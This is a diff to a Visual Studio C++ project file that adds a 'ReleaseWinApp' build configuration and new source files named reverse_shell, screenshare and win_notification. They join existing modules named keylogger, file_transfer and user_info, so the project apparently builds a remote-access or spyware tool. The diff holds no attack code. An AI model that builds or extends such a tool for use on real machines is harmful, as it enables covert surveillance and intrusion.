@@ -5,6 +5,14 @@
       <Configuration>Debug</Configuration>
       <Platform>Win32</Platform>
     </ProjectConfiguration>
+    <ProjectConfiguration Include="ReleaseWinApp|Win32">
+      <Configuration>ReleaseWinApp</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="ReleaseWinApp|x64">
+      <Configuration>ReleaseWinApp</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
     <ProjectConfiguration Include="Release|Win32">
       <Configuration>Release</Configuration>
       <Platform>Win32</Platform>
@@ -51,6 +59,12 @@
     <PlatformToolset>v143</PlatformToolset>
     <WholeProgramOptimization>true</WholeProgramOptimization>
     <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Label="Configuration" Condition="'$(Configuration)|$(Platform)'=='ReleaseWinApp|Win32'">
+    <PlatformToolset>v143</PlatformToolset>
+  </PropertyGroup>
+  <PropertyGroup Label="Configuration" Condition="'$(Configuration)|$(Platform)'=='ReleaseWinApp|x64'">
+    <PlatformToolset>v143</PlatformToolset>
   </PropertyGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
   <ImportGroup Label="ExtensionSettings">
@@ -141,23 +155,29 @@
       <OptimizeReferences>false</OptimizeReferences>
       <GenerateDebugInformation>true</GenerateDebugInformation>
       <LinkTimeCodeGeneration>Default</LinkTimeCodeGeneration>
-      <AdditionalDependencies>Ws2_32.lib;Crypt32.lib;Dbghelp.lib;Userenv.lib;Iphlpapi.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <AdditionalDependencies>Ws2_32.lib;Crypt32.lib;Dbghelp.lib;Userenv.lib;Iphlpapi.lib;runtimeobject.lib;%(AdditionalDependencies)</AdditionalDependencies>
     </Link>
   </ItemDefinitionGroup>
   <ItemGroup>
     <ClCompile Include="seeker.cpp" />
     <ClCompile Include="src\file_transfer.cpp" />
     <ClCompile Include="src\keylogger.cpp" />
+    <ClCompile Include="src\reverse_shell.cpp" />
+    <ClCompile Include="src\screenshare.cpp" />
     <ClCompile Include="src\user_info.cpp" />
     <ClCompile Include="src\util.cpp" />
     <ClCompile Include="src\websocket_client.cpp" />
+    <ClCompile Include="src\win_notification.cpp" />
   </ItemGroup>
   <ItemGroup>
     <ClInclude Include="src\file_transfer.hpp" />
     <ClInclude Include="src\keylogger.hpp" />
+    <ClInclude Include="src\reverse_shell.hpp" />
+    <ClInclude Include="src\screenshare.hpp" />
     <ClInclude Include="src\user_info.hpp" />
     <ClInclude Include="src\util.hpp" />
     <ClInclude Include="src\websocket_client.hpp" />
+    <ClInclude Include="src\win_notification.hpp" />
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
